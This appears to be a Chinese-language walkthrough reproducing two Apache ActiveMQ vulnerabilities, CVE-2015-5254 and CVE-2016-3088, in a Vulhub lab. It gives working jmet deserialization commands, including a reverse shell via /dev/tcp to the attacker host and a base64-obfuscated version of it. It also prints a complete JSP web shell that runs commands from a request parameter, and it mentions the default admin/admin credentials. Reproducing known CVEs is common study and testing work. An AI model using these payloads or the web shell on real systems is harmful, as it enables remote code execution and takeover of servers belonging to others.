     CVE-2015-5254


ActiveMQ反序列化漏洞‍


01

漏洞简述

         Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。

02

影响版本:

        Apache ActiveMQ 5.13.0之前5.x版本

03

测试环境：

  目标机：192.168.234.128

  攻击机：192.168.234.129

04

漏洞复现：

       Vulhub环境搭建->运行http://192.168.234.128:8161/->环境搭建成功

1、构造（可以使用ysoserial）可执行命令的序列化对象

    使用[jmet]进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。

wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jarmkdir external


2.作为一个消息，发送给目标61616端口

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME 192.168.234.128 61616

此时会给目标的ActiveMQ添加一个名为事件的队列。我们通过http://192.168.234.128:8161/admin/browse.jsp?JMSDestination=event看到这个队列中所有消息：

3、创建成功

此时进入容器中并查看/tmp/success已经创建：

4、反弹shell

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -i >& /dev/tcp/192.168.234.129/8888 0>&1" -Yp ROME 192.168.234.1283 61616

Base64编码

java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzNC4xMjkvODg4OCAwPiYx}|{base64,-d}|{bash,-i}" -Yp ROME 192.168.234.128 61616

5、反弹成功

              CVE-2016-3088 


Apache ActiveMQ远程命令执行漏洞


01

漏洞简述：

  该漏洞出现在fileserver应用中,漏洞原理:ActiveMQ中的fileserver服务允许用户通过HTTP PUT方法上传文件到指定目录。Fileserver支持写入文件(不解析jsp),但是支持移动文件(Move)我们可以将jsp的文件PUT到Fileserver下,然后再通过Move指令移动到可执行目录下访问。

02

影响版本:

    Apache ActiveMQ 5.0.0 – 5.13.2

03

测试环境：

 目标机：192.168.234.128

 攻击机：192.168.234.129

04

漏洞复现：

     Vulhub环境搭建->运行http://192.168.234.128:8161/->环境搭建成功

1、写入jsp文件

JSP文件如下：

<%@ page import="java.io.*"%><%out.print("Hello</br>");String strcmd=request.getParameter("cmd");String line=null;Process p=Runtime.getRuntime().exec(strcmd);BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
while((line=br.readLine())!=null){ out.print(line+"</br>");
 }%>

响应包返回204说明上传成功

由于Fileserver目录不解析jsp，所以需将jsp文件移动到可执行目录admin下

2、获取绝对路径（默认密码admin/admin）

http://192.168.234.128:8161/admin/test/systemProperties.jsp

3、移动jsp文件到admin目录下

4、远程命令执行成功

05
